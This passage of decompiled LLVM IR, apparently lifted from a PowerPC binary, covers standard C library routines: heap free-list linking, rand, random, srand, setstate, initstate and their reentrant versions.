  %v1_1001030c = add i32 %v2_10010308, 12
  %v4_10010310 = icmp eq i32 %v2_1001027c, %v1_1001030c
  br i1 %v4_10010310, label %dec_label_pc_10010318, label %dec_label_pc_10010334

dec_label_pc_10010318:                            ; preds = %dec_label_pc_10010304
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_10010324 = add i32 %v2_10010304, %v2_100102c0
  store i32 %v2_10010324, i32* @r29, align 4
  store i32 %v3_100102f8, i32* @r31, align 4
  %v5_1001032c = call i32 @__heap_link_free_area_after(i32* %arg1, i32 %v3_100102f8, i32 %v0_100102dc.lcssa, i32 %v2_1001027c)
  store i32 %v5_1001032c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001034c

dec_label_pc_10010334:                            ; preds = %dec_label_pc_10010304, %dec_label_pc_100102f8
  %v2_10010334 = add i32 %v0_100102e8.lcssa, %arg3
  store i32 %v2_10010334, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268501836, i32* @lr, align 4
  %v5_10010348 = call i32 @__heap_link_free_area(i32* %arg1, i32 %v2_10010334, i32 %v0_100102dc.lcssa, i32 %v3_100102f8)
  store i32 %v5_10010348, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001034c

dec_label_pc_1001034c:                            ; preds = %dec_label_pc_100102d0, %dec_label_pc_100102c8, %dec_label_pc_10010318, %dec_label_pc_100102dc, %dec_label_pc_10010334
  %v0_1001034c = load i32, i32* @r31, align 4
  store i32 %v0_1001034c, i32* @r30, align 4
  %v0_10010350 = load i32, i32* @r29, align 4
  %v2_10010350 = inttoptr i32 %v0_1001034c to i32*
  store i32 %v0_10010350, i32* %v2_10010350, align 4
  br label %dec_label_pc_10010374

dec_label_pc_10010358:                            ; preds = %dec_label_pc_100102a8, %dec_label_pc_100102a0
  %v2_10010358 = add i32 %v2_1001027c, -12
  %v3_10010358 = inttoptr i32 %v2_10010358 to i32*
  store i32 %arg3, i32* %v3_10010358, align 4
  %v0_1001035c = load i32, i32* %r3.global-to-local, align 4
  %v1_1001035c = add i32 %v0_1001035c, -12
  store i32 %v1_1001035c, i32* @r30, align 4
  %v0_10010360 = load i32, i32* %r11.global-to-local, align 4
  %v0_10010364 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_10010364, i32* %r3.global-to-local, align 4
  %v0_10010368 = load i32, i32* @r31, align 4
  store i32 268501876, i32* @lr, align 4
  %v4_10010370 = inttoptr i32 %v0_10010364 to i32*
  %v5_10010370 = call i32 @__heap_link_free_area(i32* %v4_10010370, i32 %v1_1001035c, i32 %v0_10010360, i32 %v0_10010368)
  store i32 %v5_10010370, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010374

dec_label_pc_10010374:                            ; preds = %dec_label_pc_1001034c, %dec_label_pc_10010358
  %v0_10010378 = load i32, i32* @r30, align 4
  store i32 %v0_10010378, i32* %r3.global-to-local, align 4
  ret i32 %v0_10010378

; uselistorder directives
  uselistorder i32 %v3_100102f8, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_100102b0, { 1, 0 }
  uselistorder i32 %v0_100102e8.lcssa, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_100102dc.lcssa, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %v3_1001028c, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v2_1001027c, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %tmp, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 8, 2, 6, 9, 3, 10, 4, 11, 5, 7, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 0, 2 }
  uselistorder i32 -12, { 2, 3, 1, 4, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32* %arg1, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_10010374, { 1, 0 }
  uselistorder label %dec_label_pc_1001034c, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_10010288, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_1001038c = call i32 @random()
  ret i32 %v0_1001038c

; uselistorder directives
  uselistorder i32 ()* @random, { 10, 7, 0, 1, 2, 3, 4, 5, 6, 8, 9 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v2_100103a4 = ptrtoint i32* %stack_var_-52 to i32
  store i32 ptrtoint (i32* @global_var_10028688.667 to i32), i32* @r29, align 4
  store i32 %v2_100103a4, i32* @r3, align 4
  %v0_100103bc = call i32 @__pthread_return_void()
  %v0_100103c4 = call i32 @__pthread_return_0()
  %v2_100103cc = ptrtoint i32* %stack_var_-56 to i32
  %v3_100103d4 = call i32 @__GI_random_r(i32* inttoptr (i32 268600992 to i32*), i32 %v2_100103cc)
  store i32 %v2_100103a4, i32* @r3, align 4
  %v0_100103e0 = call i32 @__pthread_return_void()
  %v3_100103e8 = load i32, i32* %stack_var_-56, align 4
  ret i32 %v3_100103e8
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10028688.667 to i32), i32* %r29.global-to-local, align 4
  %v2_10010420 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10010420, i32* @r3, align 4
  %v0_10010428 = call i32 @__pthread_return_void()
  %v0_10010430 = call i32 @__pthread_return_0()
  store i32 268502092, i32* @lr, align 4
  %v3_10010448 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_100286a0)
  store i32 0, i32* %r29.global-to-local, align 4
  %v1_10010450 = icmp slt i32 %v3_10010448, 0
  store i32 %v2_10010420, i32* @r3, align 4
  br i1 %v1_10010450, label %dec_label_pc_10010464, label %dec_label_pc_10010460

dec_label_pc_10010460:                            ; preds = %entry
  store i32 ptrtoint (i32** @global_var_100286a4.671 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10010464

dec_label_pc_10010464:                            ; preds = %entry, %dec_label_pc_10010460
  %v0_10010464 = call i32 @__pthread_return_void()
  %v0_1001046c = load i32, i32* %r29.global-to-local, align 4
  ret i32 %v0_1001046c

; uselistorder directives
  uselistorder i32* %r29.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10010464, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %v2_10010490 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10010490, i32* @r3, align 4
  %v0_100104b8 = call i32 @__pthread_return_void()
  %v0_100104c0 = call i32 @__pthread_return_0()
  store i32 %arg1, i32* @r3, align 4
  store i32 268502240, i32* @lr, align 4
  %v4_100104dc = inttoptr i32 %arg1 to i32*
  %v5_100104dc = call i32 @__GI_initstate_r(i32* %v4_100104dc, i32 %arg2, i32 %arg3, i32 ptrtoint (i32* @global_var_100286a0 to i32))
  store i32 %v2_10010490, i32* @r3, align 4
  %v0_100104e8 = call i32 @__pthread_return_void()
  ret i32 ptrtoint (i32** @global_var_100286a4.671 to i32)

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1001051c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1001051c, i32* @r3, align 4
  %v0_10010538 = call i32 @__pthread_return_void()
  %v0_10010540 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_100286a0 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 268502356, i32* @lr, align 4
  %v0_10010550 = call i32 @srandom_r()
  store i32 %v2_1001051c, i32* @r3, align 4
  %v0_1001055c = call i32 @__pthread_return_void()
  ret i32 %v0_1001055c

; uselistorder directives
  uselistorder i32* @global_var_100286a0, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_100286a0 to i32), { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_10010574 = add i32 %tmp, 12
  %v2_10010574 = inttoptr i32 %v1_10010574 to i32*
  %v3_10010574 = load i32, i32* %v2_10010574, align 4
  store i32 %v3_10010574, i32* %r11.global-to-local, align 4
  %v0_10010578 = load i32, i32* @lr, align 4
  store i32 %v0_10010578, i32* %r0.global-to-local, align 4
  %v1_10010580 = add i32 %arg1, 4
  store i32 %v1_10010580, i32* %r3.global-to-local, align 4
  %v3_10010584 = icmp eq i32 %v3_10010574, 0
  %v1_10010588 = add i32 %tmp, 8
  %v2_10010588 = inttoptr i32 %v1_10010588 to i32*
  %v3_10010588 = load i32, i32* %v2_10010588, align 4
  store i32 %v3_10010588, i32* %r9.global-to-local, align 4
  br i1 %v3_10010584, label %dec_label_pc_10010594, label %dec_label_pc_1001059c

dec_label_pc_10010594:                            ; preds = %entry
  %v2_10010594 = add i32 %v3_10010588, -4
  %v3_10010594 = inttoptr i32 %v2_10010594 to i32*
  store i32 0, i32* %v3_10010594, align 4
  br label %dec_label_pc_100105b4

dec_label_pc_1001059c:                            ; preds = %entry
  %v1_1001059c = add i32 %tmp, 4
  %v2_1001059c = inttoptr i32 %v1_1001059c to i32*
  %v3_1001059c = load i32, i32* %v2_1001059c, align 4
  %v2_100105a0 = sub i32 %v3_1001059c, %v3_10010588
  %v4_100105a4 = sdiv i32 %v2_100105a0, 4
  %v1_100105a8 = mul i32 %v4_100105a4, 5
  %v2_100105ac = add i32 %v1_100105a8, %v3_10010574
  store i32 %v2_100105ac, i32* %r0.global-to-local, align 4
  %v2_100105b0 = add i32 %v3_10010588, -4
  %v3_100105b0 = inttoptr i32 %v2_100105b0 to i32*
  store i32 %v2_100105ac, i32* %v3_100105b0, align 4
  br label %dec_label_pc_100105b4

dec_label_pc_100105b4:                            ; preds = %dec_label_pc_10010594, %dec_label_pc_1001059c
  %v0_100105b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_100105b4 = add i32 %v0_100105b4, -4
  %v2_100105b4 = inttoptr i32 %v1_100105b4 to i32*
  %v3_100105b4 = load i32, i32* %v2_100105b4, align 4
  store i32 5, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10017db8.672 to i32), i32* %r9.global-to-local, align 4
  %v2_100105c4 = srem i32 %v3_100105b4, 5
  store i32 %v2_100105c4, i32* %r11.global-to-local, align 4
  %v2_100105d4 = icmp ugt i32 %v2_100105c4, 4
  %v1_100105d8 = mul nsw i32 %v2_100105c4, 4
  store i32 %v1_100105d8, i32* %r0.global-to-local, align 4
  %v2_100105e0 = add i32 %v1_100105d8, ptrtoint (i32* @global_var_10017db8.672 to i32)
  store i32 %v2_100105e0, i32* %r10.global-to-local, align 4
  br i1 %v2_100105d4, label %dec_label_pc_10010644, label %dec_label_pc_100105e8

dec_label_pc_100105e8:                            ; preds = %dec_label_pc_100105b4
  %v3_100105dc = icmp eq i32 %v2_100105c4, 0
  %v1_100105e8 = add i32 %v1_100105d8, add (i32 ptrtoint (i32* @global_var_10017db8.672 to i32), i32 20)
  %v2_100105e8 = inttoptr i32 %v1_100105e8 to i32*
  %v3_100105e8 = load i32, i32* %v2_100105e8, align 4
  store i32 %v3_100105e8, i32* %r10.global-to-local, align 4
  %v3_100105ec = inttoptr i32 %v2_100105e0 to i32*
  %v4_100105ec = load i32, i32* %v3_100105ec, align 4
  store i32 %v4_100105ec, i32* %r9.global-to-local, align 4
  %v1_100105f0 = mul i32 %v3_100105e8, 4
  store i32 %v1_100105f0, i32* %r0.global-to-local, align 4
  %v2_100105f4 = add i32 %tmp, 16
  %v3_100105f4 = inttoptr i32 %v2_100105f4 to i32*
  store i32 %v3_100105e8, i32* %v3_100105f4, align 4
  %v0_100105f8 = load i32, i32* %r9.global-to-local, align 4
  %v2_100105f8 = add i32 %tmp, 20
  %v3_100105f8 = inttoptr i32 %v2_100105f8 to i32*
  store i32 %v0_100105f8, i32* %v3_100105f8, align 4
  %v0_100105fc = load i32, i32* %r3.global-to-local, align 4
  %v1_100105fc = load i32, i32* %r0.global-to-local, align 4
  %v2_100105fc = add i32 %v1_100105fc, %v0_100105fc
  store i32 %v2_100105fc, i32* %r8.global-to-local, align 4
  %v0_10010600 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10010600, i32* %v2_10010574, align 4
  br i1 %v3_100105dc, label %dec_label_pc_10010638, label %dec_label_pc_10010608

dec_label_pc_10010608:                            ; preds = %dec_label_pc_100105e8
  %v0_10010608 = load i32, i32* %r3.global-to-local, align 4
  %v1_10010608 = add i32 %v0_10010608, -4
  %v2_10010608 = inttoptr i32 %v1_10010608 to i32*
  %v3_10010608 = load i32, i32* %v2_10010608, align 4
  %v1_1001060c = load i32, i32* %r7.global-to-local, align 4
  %v2_1001060c = sdiv i32 %v3_10010608, %v1_1001060c
  %v1_10010610 = load i32, i32* %r9.global-to-local, align 4
  %v2_10010610 = add i32 %v1_10010610, %v2_1001060c
  store i32 %v2_10010610, i32* %r9.global-to-local, align 4
  %v1_10010614 = mul i32 %v2_1001060c, 4
  %v1_10010618 = load i32, i32* %r10.global-to-local, align 4
  %v2_10010618 = sdiv i32 %v2_10010610, %v1_10010618
  store i32 %v2_10010618, i32* %r11.global-to-local, align 4
  %v2_1001061c = add i32 %v1_10010614, %v0_10010608
  store i32 %v2_1001061c, i32* %r0.global-to-local, align 4
  %v2_10010620 = add i32 %tmp, 4
  %v3_10010620 = inttoptr i32 %v2_10010620 to i32*
  store i32 %v2_1001061c, i32* %v3_10010620, align 4
  %v0_10010624 = load i32, i32* %r11.global-to-local, align 4
  %v1_10010624 = load i32, i32* %r10.global-to-local, align 4
  %v2_10010624 = mul i32 %v1_10010624, %v0_10010624
  store i32 %v2_10010624, i32* %r11.global-to-local, align 4
  %v1_10010628 = load i32, i32* %r9.global-to-local, align 4
  %v2_10010628 = sub i32 %v1_10010628, %v2_10010624
  %v1_1001062c = mul i32 %v2_10010628, 4
  %v0_10010630 = load i32, i32* %r3.global-to-local, align 4
  %v2_10010630 = add i32 %v1_1001062c, %v0_10010630
  store i32 %v2_10010630, i32* %r9.global-to-local, align 4
  store i32 %v2_10010630, i32* %arg2, align 4
  br label %dec_label_pc_10010638

dec_label_pc_10010638:                            ; preds = %dec_label_pc_100105e8, %dec_label_pc_10010608
  %v0_10010638 = load i32, i32* %r8.global-to-local, align 4
  %v2_10010638 = add i32 %tmp, 24
  %v3_10010638 = inttoptr i32 %v2_10010638 to i32*
  store i32 %v0_10010638, i32* %v3_10010638, align 4
  %v0_1001063c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1001063c, i32* %v2_10010588, align 4
  %v0_10010658.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10010654

dec_label_pc_10010644:                            ; preds = %dec_label_pc_100105b4
  %v0_10010644 = call i32 @__errno_location()
  store i32 %v0_10010644, i32* %r3.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_1001064c = inttoptr i32 %v0_10010644 to i32*
  store i32 22, i32* %v2_1001064c, align 4
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10010654

dec_label_pc_10010654:                            ; preds = %dec_label_pc_10010638, %dec_label_pc_10010644
  %v0_10010658 = phi i32 [ %v0_10010658.pre, %dec_label_pc_10010638 ], [ -1, %dec_label_pc_10010644 ]
  store i32 %v0_10010578, i32* %r0.global-to-local, align 4
  store i32 %v0_10010658, i32* %r3.global-to-local, align 4
  ret i32 %v0_10010658

; uselistorder directives
  uselistorder i32 %v0_10010658, { 1, 0 }
  uselistorder i32 %v3_100105e8, { 1, 0, 2 }
  uselistorder i32 %v1_100105d8, { 2, 1, 0 }
  uselistorder i32 %v2_100105c4, { 3, 0, 2, 1 }
  uselistorder i32 %tmp, { 5, 0, 6, 4, 1, 2, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 8, 0 }
  uselistorder label %dec_label_pc_10010654, { 1, 0 }
  uselistorder label %dec_label_pc_10010638, { 1, 0 }
  uselistorder label %dec_label_pc_100105b4, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_10010668 = add i32 %tmp, 12
  %v2_10010668 = inttoptr i32 %v1_10010668 to i32*
  %v3_10010668 = load i32, i32* %v2_10010668, align 4
  %v1_10010674 = add i32 %tmp, 8
  %v2_10010674 = inttoptr i32 %v1_10010674 to i32*
  %v3_10010674 = load i32, i32* %v2_10010674, align 4
  store i32 %v3_10010674, i32* %r7.global-to-local, align 4
  %v3_10010678 = icmp eq i32 %v3_10010668, 0
  br i1 %v3_10010678, label %dec_label_pc_10010680, label %dec_label_pc_1001069c

dec_label_pc_10010680:                            ; preds = %entry
  %v1_10010680 = inttoptr i32 %v3_10010674 to i32*
  %v2_10010680 = load i32, i32* %v1_10010680, align 4
  %v2_10010684 = mul i32 %v2_10010680, 1103515245
  %v1_10010688 = add i32 %v2_10010684, 12345
  %v1_1001068c = urem i32 %v1_10010688, -2147483648
  store i32 %v1_1001068c, i32* %r9.global-to-local, align 4
  store i32 %v1_1001068c, i32* %v1_10010680, align 4
  %v0_10010694 = load i32, i32* %r9.global-to-local, align 4
  %v2_10010694 = inttoptr i32 %arg2 to i32*
  store i32 %v0_10010694, i32* %v2_10010694, align 4
  br label %dec_label_pc_100106f0

dec_label_pc_1001069c:                            ; preds = %entry
  %v2_1001069c = load i32, i32* %arg1, align 4
  %v1_100106a0 = add i32 %tmp, 4
  %v2_100106a0 = inttoptr i32 %v1_100106a0 to i32*
  %v3_100106a0 = load i32, i32* %v2_100106a0, align 4
  store i32 %v3_100106a0, i32* %r9.global-to-local, align 4
  %v1_100106a4 = add i32 %tmp, 24
  %v2_100106a4 = inttoptr i32 %v1_100106a4 to i32*
  %v3_100106a4 = load i32, i32* %v2_100106a4, align 4
  %v1_100106a8 = add i32 %v2_1001069c, 4
  store i32 %v1_100106a8, i32* @r8, align 4
  %v1_100106ac = add i32 %v3_100106a0, 4
  %v1_100106b0 = inttoptr i32 %v3_100106a0 to i32*
  %v2_100106b0 = load i32, i32* %v1_100106b0, align 4
  store i32 %v2_100106b0, i32* %r9.global-to-local, align 4
  %v2_100106b4 = icmp ult i32 %v1_100106a8, %v3_100106a4
  %v1_100106bc = inttoptr i32 %v2_1001069c to i32*
  %v2_100106bc = load i32, i32* %v1_100106bc, align 4
  store i32 %v1_100106ac, i32* %r10.global-to-local, align 4
  %v2_100106c4 = add i32 %v2_100106bc, %v2_100106b0
  %v1_100106c8 = udiv i32 %v2_100106c4, 2
  store i32 %v1_100106c8, i32* %r9.global-to-local, align 4
  store i32 %v2_100106c4, i32* %v1_100106bc, align 4
  %v0_100106d0 = load i32, i32* %r9.global-to-local, align 4
  %v2_100106d0 = inttoptr i32 %arg2 to i32*
  store i32 %v0_100106d0, i32* %v2_100106d0, align 4
  br i1 %v2_100106b4, label %dec_label_pc_100106e0, label %dec_label_pc_100106d8

dec_label_pc_100106d8:                            ; preds = %dec_label_pc_1001069c
  %v0_100106d8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_100106d8, i32* @r8, align 4
  br label %dec_label_pc_100106e8

dec_label_pc_100106e0:                            ; preds = %dec_label_pc_1001069c
  %v2_100106b8 = icmp ult i32 %v1_100106ac, %v3_100106a4
  br i1 %v2_100106b8, label %dec_label_pc_100106e8, label %dec_label_pc_100106e4

dec_label_pc_100106e4:                            ; preds = %dec_label_pc_100106e0
  %v0_100106e4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_100106e4, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_100106e8

dec_label_pc_100106e8:                            ; preds = %dec_label_pc_100106e0, %dec_label_pc_100106d8, %dec_label_pc_100106e4
  %v0_100106e8 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_100106e8, i32* %v2_100106a0, align 4
  %v0_100106ec = load i32, i32* @r8, align 4
  store i32 %v0_100106ec, i32* %arg1, align 4
  br label %dec_label_pc_100106f0

dec_label_pc_100106f0:                            ; preds = %dec_label_pc_10010680, %dec_label_pc_100106e8
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_100106c4, { 1, 0 }
  uselistorder i32 %v1_100106ac, { 1, 0 }
  uselistorder i32 %v3_100106a0, { 1, 0, 2 }
  uselistorder i32 %v1_1001068c, { 1, 0 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_100106f0, { 1, 0 }
  uselistorder label %dec_label_pc_100106e8, { 2, 0, 1 }
}

define i32 @srandom_r() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_100106f8 = load i32, i32* @lr, align 4
  %v0_10010704 = load i32, i32* @r4, align 4
  store i32 %v0_10010704, i32* @r30, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_10010710 = add i32 %v0_10010704, 12
  %v2_10010710 = inttoptr i32 %v1_10010710 to i32*
  %v3_10010710 = load i32, i32* %v2_10010710, align 4
  %v2_10010714 = icmp ugt i32 %v3_10010710, 4
  br i1 %v2_10010714, label %dec_label_pc_100107c4, label %dec_label_pc_1001071c

dec_label_pc_1001071c:                            ; preds = %entry
  %v0_1001071c = load i32, i32* @r3, align 4
  %v3_1001071c = icmp eq i32 %v0_1001071c, 0
  %v1_10010720 = add i32 %v0_10010704, 8
  %v2_10010720 = inttoptr i32 %v1_10010720 to i32*
  %v3_10010720 = load i32, i32* %v2_10010720, align 4
  store i32 %v3_10010720, i32* %r10.global-to-local, align 4
  br i1 %v3_1001071c, label %dec_label_pc_10010728, label %dec_label_pc_1001072c

dec_label_pc_10010728:                            ; preds = %dec_label_pc_1001071c
  store i32 1, i32* @r3, align 4
  br label %dec_label_pc_1001072c

dec_label_pc_1001072c:                            ; preds = %dec_label_pc_1001071c, %dec_label_pc_10010728
  %v0_10010730 = phi i32 [ %v0_1001071c, %dec_label_pc_1001071c ], [ 1, %dec_label_pc_10010728 ]
  %v3_1001072c = icmp eq i32 %v3_10010710, 0
  %v2_10010730 = inttoptr i32 %v3_10010720 to i32*
  store i32 %v0_10010730, i32* %v2_10010730, align 4
  br i1 %v3_1001072c, label %dec_label_pc_100107c0, label %dec_label_pc_10010738

dec_label_pc_10010738:                            ; preds = %dec_label_pc_1001072c
  %v0_10010738 = load i32, i32* @r30, align 4
  %v1_10010738 = add i32 %v0_10010738, 16
  %v2_10010738 = inttoptr i32 %v1_10010738 to i32*
  %v3_10010738 = load i32, i32* %v2_10010738, align 4
  store i32 %v3_10010738, i32* %r11.global-to-local, align 4
  store i32 127773, i32* @r8, align 4
  store i32 2147483647, i32* %r7.global-to-local, align 4
  %v0_10010750 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v3_10010738, i32* %ctr.global-to-local, align 4
  %tmp18 = icmp sgt i32 %v3_10010738, 0
  br i1 %tmp18, label %dec_label_pc_1001078c.preheader, label %dec_label_pc_1001078c.preheader.thread

dec_label_pc_1001078c.preheader.thread:           ; preds = %dec_label_pc_10010738
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10010790

dec_label_pc_1001078c.preheader:                  ; preds = %dec_label_pc_10010738
  %v1_1001078c2 = add i32 %v3_10010738, -1
  store i32 %v1_1001078c2, i32* %ctr.global-to-local, align 4
  %v2_1001078c3 = icmp eq i32 %v1_1001078c2, 0
  br i1 %v2_1001078c3, label %dec_label_pc_10010790, label %dec_label_pc_10010768

dec_label_pc_10010768:                            ; preds = %dec_label_pc_1001078c.preheader, %dec_label_pc_10010788.dec_label_pc_10010768_crit_edge
  %v1_10010788 = phi i32 [ %v2_10010788, %dec_label_pc_10010788.dec_label_pc_10010768_crit_edge ], [ %v0_10010750, %dec_label_pc_1001078c.preheader ]
  %v1_10010768 = phi i32 [ %v1_10010768.pre, %dec_label_pc_10010788.dec_label_pc_10010768_crit_edge ], [ 127773, %dec_label_pc_1001078c.preheader ]
  %v0_10010768 = load i32, i32* @r3, align 4
  %v2_10010768 = sdiv i32 %v0_10010768, %v1_10010768
  %v2_1001076c = mul i32 %v2_10010768, %v1_10010768
  %v2_10010770 = sub i32 %v0_10010768, %v2_1001076c
  %v1_10010774 = mul i32 %v2_10010768, 2836
  store i32 %v1_10010774, i32* %r0.global-to-local, align 4
  %v1_10010778 = mul i32 %v2_10010770, 16807
  %v2_1001077c = sub i32 %v1_10010778, %v1_10010774
  store i32 %v2_1001077c, i32* @r3, align 4
  %tmp19 = icmp sgt i32 %v2_1001077c, -1
  br i1 %tmp19, label %dec_label_pc_10010788, label %dec_label_pc_10010784

dec_label_pc_10010784:                            ; preds = %dec_label_pc_10010768
  %v1_10010784 = load i32, i32* %r7.global-to-local, align 4
  %v2_10010784 = add i32 %v1_10010784, %v2_1001077c
  store i32 %v2_10010784, i32* @r3, align 4
  br label %dec_label_pc_10010788

dec_label_pc_10010788:                            ; preds = %dec_label_pc_10010768, %dec_label_pc_10010784
  %v0_10010788 = phi i32 [ %v2_1001077c, %dec_label_pc_10010768 ], [ %v2_10010784, %dec_label_pc_10010784 ]
  %v2_10010788 = add i32 %v1_10010788, 4
  %v3_10010788 = inttoptr i32 %v2_10010788 to i32*
  store i32 %v0_10010788, i32* %v3_10010788, align 4
  %v0_1001078c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001078c = add i32 %v0_1001078c, -1
  store i32 %v1_1001078c, i32* %ctr.global-to-local, align 4
  %v2_1001078c = icmp eq i32 %v1_1001078c, 0
  br i1 %v2_1001078c, label %dec_label_pc_1001078c.dec_label_pc_10010790_crit_edge, label %dec_label_pc_10010788.dec_label_pc_10010768_crit_edge

dec_label_pc_10010788.dec_label_pc_10010768_crit_edge: ; preds = %dec_label_pc_10010788
  %v1_10010768.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_10010768

dec_label_pc_1001078c.dec_label_pc_10010790_crit_edge: ; preds = %dec_label_pc_10010788
  %v0_10010790.pre = load i32, i32* @r30, align 4
  %v0_10010794.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_10010798.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10010790

dec_label_pc_10010790:                            ; preds = %dec_label_pc_1001078c.preheader.thread, %dec_label_pc_1001078c.dec_label_pc_10010790_crit_edge, %dec_label_pc_1001078c.preheader
  %v0_10010798 = phi i32 [ %v0_10010798.pre, %dec_label_pc_1001078c.dec_label_pc_10010790_crit_edge ], [ %v0_10010750, %dec_label_pc_1001078c.preheader ], [ %v0_10010750, %dec_label_pc_1001078c.preheader.thread ]
  %v0_10010794 = phi i32 [ %v0_10010794.pre, %dec_label_pc_1001078c.dec_label_pc_10010790_crit_edge ], [ %v3_10010738, %dec_label_pc_1001078c.preheader ], [ %v3_10010738, %dec_label_pc_1001078c.preheader.thread ]
  %v1_10010798 = phi i32 [ %v0_10010790.pre, %dec_label_pc_1001078c.dec_label_pc_10010790_crit_edge ], [ %v0_10010738, %dec_label_pc_1001078c.preheader ], [ %v0_10010738, %dec_label_pc_1001078c.preheader.thread ]
  %v1_10010790 = add i32 %v1_10010798, 20
  %v2_10010790 = inttoptr i32 %v1_10010790 to i32*
  %v3_10010790 = load i32, i32* %v2_10010790, align 4
  store i32 %v3_10010790, i32* %r0.global-to-local, align 4
  %v1_10010794 = mul i32 %v0_10010794, 10
  store i32 %v1_10010794, i32* %r31.global-to-local, align 4
  %v2_10010798 = add i32 %v1_10010798, 4
  %v3_10010798 = inttoptr i32 %v2_10010798 to i32*
  store i32 %v0_10010798, i32* %v3_10010798, align 4
  %v0_1001079c = load i32, i32* %r0.global-to-local, align 4
  %v1_1001079c = mul i32 %v0_1001079c, 4
  %v0_100107a0 = load i32, i32* %r10.global-to-local, align 4
  %v2_100107a0 = add i32 %v0_100107a0, %v1_1001079c
  store i32 %v2_100107a0, i32* %r0.global-to-local, align 4
  %v1_100107a4 = load i32, i32* @r30, align 4
  %v2_100107a4 = inttoptr i32 %v1_100107a4 to i32*
  store i32 %v2_100107a0, i32* %v2_100107a4, align 4
  %v2_100107b8 = ptrtoint i32* %stack_var_-24 to i32
  %v0_100107b021 = load i32, i32* %r31.global-to-local, align 4
  %v1_100107b022 = add i32 %v0_100107b021, -1
  store i32 %v1_100107b022, i32* @r31, align 4
  %tmp2025 = icmp sgt i32 %v1_100107b022, -1
  br i1 %tmp2025, label %dec_label_pc_100107ac, label %dec_label_pc_100107c0

